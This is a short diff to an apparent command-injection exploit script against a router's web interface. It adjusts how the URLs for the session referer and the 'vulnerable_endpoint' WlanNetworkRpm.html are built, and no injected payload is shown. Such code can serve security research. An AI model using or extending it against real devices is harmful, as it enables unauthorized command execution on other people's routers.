@@ -323,7 +323,7 @@ def command_injection(target_url: str, password: str, command: str) -> None:
     session_id = get_sessionID(target_url, token)
 
     session_cookie = {"Authorization": token}
-    referer = f"http://{target_url}{session_id}/userRpm/MenuRpm.htm"
+    referer = f"{target_url}{session_id}/userRpm/MenuRpm.htm"
     headers = {
         "Referer": referer,
         "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
@@ -350,9 +350,7 @@ def command_injection(target_url: str, password: str, command: str) -> None:
     }
 
     try:
-        vulnerable_endpoint = (
-            f"http://{target_url}{session_id}/userRpm/WlanNetworkRpm.html"
-        )
+        vulnerable_endpoint = f"{target_url}{session_id}/userRpm/WlanNetworkRpm.html"
         response = requests.get(
             vulnerable_endpoint,
             params=params,
